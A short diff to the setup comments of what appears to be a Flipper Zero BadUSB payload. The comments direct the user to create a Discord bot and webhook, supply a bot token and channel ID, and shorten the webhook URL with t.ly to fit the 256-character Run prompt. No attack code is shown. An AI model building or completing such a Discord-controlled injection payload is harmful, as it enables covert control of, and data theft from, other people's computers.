@@ -9,7 +9,7 @@ REM make a discord bot at https://discord.com/developers/applications/
 REM add the bot to your discord server
 REM create a webhook in the desired channel on your server. ( channel-settings/integrations )
 REM FLIPPER ONLY - goto https://t.ly and make a short link for the webhook. (run prompt only allows 256 characters!)
-REM Change WEBHOOK_URL below to your webhook URL eg. https://discord.com/api/webhooks/123445623531/f4fw3f4r46r44343t5gxxxxxx
+REM Change WEBHOOK_URL below to your short webhook URL eg. https://t.ly/byuf4e
 REM Change BOT_TOKEN below with your bot token
 REM Change CHANNEL_ID below to the channel id of your webhook.
 
